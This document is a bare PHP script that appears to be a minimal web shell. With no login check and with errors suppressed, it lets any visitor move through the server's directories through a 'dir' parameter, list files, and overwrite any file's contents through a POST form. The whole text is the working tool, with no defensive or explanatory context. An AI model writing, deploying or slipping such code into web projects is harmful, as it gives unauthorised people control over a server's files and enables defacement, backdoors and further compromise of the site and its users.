<?php
define('SEP', '/');
function curldir() {
	$curldir = @str_replace('\\', '/', @getcwd());
	return $curldir;
}
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
function getdirname($dir) {
	$scandir = @scandir($dir);
	return $scandir;
}
function edit($filename) {
	if (isset($_POST['edit'])) {
		if (@file_put_contents($filename, $_POST['edit'])) {
			$valid = "Success";
		} else {
			$valid = "Failed";
		}
	} $text = @htmlspecialchars(@file_get_contents($filename));
	?>
	<center>
		<form method="post">
			<textarea name="edit"><?php print $text ?></textarea><br>
			<input type="submit">
		</form>
	</center>
	<?php
}
if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
	@edit($_GET['files']);
}
foreach (getdirname(curldir()) as $dir) {
	if(!is_dir($dir)) continue;
	if ($dir === '.') {
		$acction = "<center>--</center>";
	} if ($dir === '..') {
		$acction = "<center>--</center>";
	}
	print("<a href='?dir=".curldir().SEP.$dir."'>".$dir."</a>");
}
foreach (getdirname(curldir()) as $file) {
	if(!is_file($file)) continue;
	$tools = "<center>--</center>";
	print("<a href='?action=edit&dir=".curldir()."&files=".$file."'>".$file."</a>");
}
